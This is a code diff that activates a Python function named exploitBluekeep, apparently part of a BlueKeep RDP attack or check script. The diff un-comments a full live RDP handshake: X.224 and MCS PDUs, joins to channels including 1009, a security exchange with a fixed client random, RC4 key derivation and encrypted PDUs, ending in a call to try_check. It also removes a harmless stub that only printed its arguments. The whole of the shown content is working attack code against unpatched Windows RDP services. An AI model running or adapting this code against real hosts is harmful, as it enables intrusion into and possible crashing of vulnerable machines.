@@ -352,90 +352,65 @@ def try_check(s, rc4enckey, hmackey):
 
 
 def exploitBluekeep(host, port, hostname, username):
-    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # s.connect((host,port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    
+    x_224_conn_req = check_rdp_vuln(username)
+    s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
+    s.recv(8192)
 
-    # print("[+] Verifying RDP Portocol....")    
-    # x_224_conn_req = check_rdp_vuln(username)
-    # s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
-    # s.recv(8192)
+    s.sendall(pdu_connect_initial(hostname))
+    res = s.recv(10000)
 
-    # print "[+] PDU X.224 Response Received."
-    # print "[+] Sending MCS Connect Initial PDU with GCC Conference." 
-    # s.sendall(pdu_connect_initial(hostname))
-    # res = s.recv(10000)
+    rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)
 
-    # print "[+] MCS Response PDU with GCC Conference Received."
-    # rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)
+    s.sendall(mcs_erect_domain_pdu())
 
-    # print "[+] Sending MCS Erect Request."
-    # s.sendall(mcs_erect_domain_pdu())
+    s.sendall(msc_attach_user_pdu())
 
-    # print "[+] Sending MCS Attach User PDU Request."
-    # s.sendall(msc_attach_user_pdu())
+    res = s.recv(8192)
+    mcs_packet = bytearray(res)
+    user1= mcs_packet[9] + mcs_packet[10]
 
-    # res = s.recv(8192)
-    # mcs_packet = bytearray(res)
-    # user1= mcs_packet[9] + mcs_packet[10]
+    s.sendall(pdu_channel_request(user1, 1009))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1003))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1004))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1005))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1006))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1007))
+    s.recv(8192)
+    s.sendall(pdu_channel_request(user1, 1008))
+    s.recv(8192)
 
-    # print("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1))
-    # s.sendall(pdu_channel_request(user1, 1009))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1003))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1004))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1005))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1006))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1007))
-    # s.recv(8192)
-    # s.sendall(pdu_channel_request(user1, 1008))
-    # s.recv(8192)
+    client_rand = "\x41" * 32
+    rcran = bytes_to_bignum(client_rand)
 
-    # client_rand = "\x41" * 32
-    # rcran = bytes_to_bignum(client_rand)
+    s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen))
 
-    # print("[+] Sending security exchange PDU")
-    # s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen))
+    rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)
 
-    # rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)
+    rc4enckey = ARC4.new(rc4encstart)
 
-    # print("- RC4_ENC_KEY: {}".format(bin_to_hex(rc4encstart)))
-    # print("- RC4_DEC_KEY: {}".format(bin_to_hex(rc4decstart)))
-    # print("- HMAC_KEY: {}".format(bin_to_hex(hmackey)))
-    # print("- SESS_BLOB: {}".format(bin_to_hex(sessblob)))
+    s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
+    res = s.recv(8192)
 
-    # rc4enckey = ARC4.new(rc4encstart)
+    res = s.recv(8192)
 
-    # print("[+] Sending encrypted client info PDU")
-    # s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
-    # res = s.recv(8192)
+    s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))
 
-    # print("[+] Received License packet: {}".format(bin_to_hex(res)))
+    synch = rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
+    coop = rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
+    s.sendall(synch + coop)
 
-    # res = s.recv(8192)
-    # print("[+] Received Server Demand packet: {}".format(bin_to_hex(res)))
+    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))
 
-    # print("[+] Sending client confirm active PDU")
-    # s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))
+    s.sendall(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))
 
-    # print("[+] Sending client synchronize PDU")
-    # print("[+] Sending client control cooperate PDU")
-    # synch = rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
-    # coop = rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
-    # s.sendall(synch + coop)
+    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))
 
-    # print("[+] Sending client control request control PDU")
-    # s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))
-
-    # print("[+] Sending client persistent key list PDU")
-    # s.sendall(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))
-
-    # print("[+] Sending client font list PDU")
-    # s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))
-
-    # return try_check(s,rc4enckey, hmackey)
-    print(host, port, hostname, username)
-    return True
+    return try_check(s,rc4enckey, hmackey)
